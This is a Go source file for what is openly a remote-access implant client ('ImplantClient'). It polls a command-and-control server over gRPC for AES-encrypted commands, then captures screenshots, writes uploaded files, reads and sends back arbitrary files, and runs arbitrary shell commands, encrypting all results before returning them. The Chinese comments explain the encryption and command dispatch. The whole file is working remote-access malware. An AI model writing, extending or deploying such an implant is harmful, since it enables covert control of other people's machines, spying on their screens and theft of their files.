package main

import (
	"context"
	"fmt"
	"google.golang.org/grpc"
	"gotoexec/grpcapi"
	"gotoexec/util"
	"log"
	"os"
	"os/exec"
	"strings"
	"time"
)

func main()  {
	var (
		opts []grpc.DialOption
		conn *grpc.ClientConn
		err error
		client grpcapi.ImplantClient
	)
	opts = append(opts, grpc.WithInsecure())
	opts = append(opts, grpc.WithDefaultCallOptions(grpc.MaxCallRecvMsgSize(1024 * 1024 * 12 )))
	opts = append(opts, grpc.WithDefaultCallOptions(grpc.MaxCallSendMsgSize(1024 * 1024 * 12)))

	if conn,err = grpc.Dial(fmt.Sprintf("0.0.0.0:%d",1961), opts...); err != nil {
		log.Fatal(err)
	}
	defer conn.Close()
	client = grpcapi.NewImplantClient(conn)

	ctx := context.Background()
	for {
		var req = new(grpcapi.Empty)
		cmd, err := client.FetchCommand(ctx, req)
		if err != nil {
			log.Fatal(err)
		}
		if cmd.In == "" {
			t,_ := client.GetSleepTime(ctx,req)
			fmt.Println("sleep"+t.String())
			time.Sleep(time.Duration(t.Time)* time.Second)
			continue
		}
		//从服务端获取到命令后先进行解密处理
		command, _ := util.DecryptByAes(cmd.In)
		tokens := strings.Split(string(command), " ")
		//根据输入的命令 进行 一个判断
		//输入的命令为screenshot 就进入下面的流程
		if tokens[0] == "screenshot" {
			images := util.Screenshot()
			for _,image := range images {
				result,_ := util.EncryptByAes(util.ImageToByte(image))
				cmd.Out += result
				cmd.Out += ";"
			}
			client.SendOutput(ctx, cmd)
			continue
		}
		//匹配上传命令
		if tokens[0] == "upload" {
			//fmt.Println(cmd.Out)
			file,_ := util.DecryptByAes(cmd.Out)
			err := os.WriteFile(tokens[2],file,0666)
			if err != nil{
				cmd.Out,_ = util.EncryptByAes([]byte(err.Error()))
				client.SendOutput(ctx, cmd)
			} else {
				cmd.Out,_ = util.EncryptByAes([]byte("upload success!"))
				client.SendOutput(ctx, cmd)
			}

			continue
		}
		//匹配下载命令
		if tokens[0] == "download" {
			file,err := os.ReadFile(tokens[1])
			if err != nil {
				cmd.Out,_ = util.EncryptByAes([]byte("download err! "+err.Error()))
				client.SendOutput(ctx, cmd)
			}else {
				cmd.Out,_ = util.EncryptByAes(file)
				_,err2 := client.SendOutput(ctx, cmd)
				if err2 != nil {
					fmt.Println(err2.Error())
				}
			}

			continue
		}
		fmt.Println(tokens)
		var c *exec.Cmd
		if len(tokens) == 1 {
			c = exec.Command(tokens[0])
		} else {
			c = exec.Command(tokens[0], tokens[1:]...)
		}
		buf, err := c.CombinedOutput()
		if err != nil {
			//报错进行加密

			cmd.Out =  err.Error()

		}
		//将结果发送给服务端时先进行加密处理
		cmd.Out += string(buf)
		cmd.Out,_ = util.EncryptByAes([]byte(cmd.Out))
		fmt.Println(cmd.In+cmd.Out)
		client.SendOutput(ctx, cmd)
	}
}

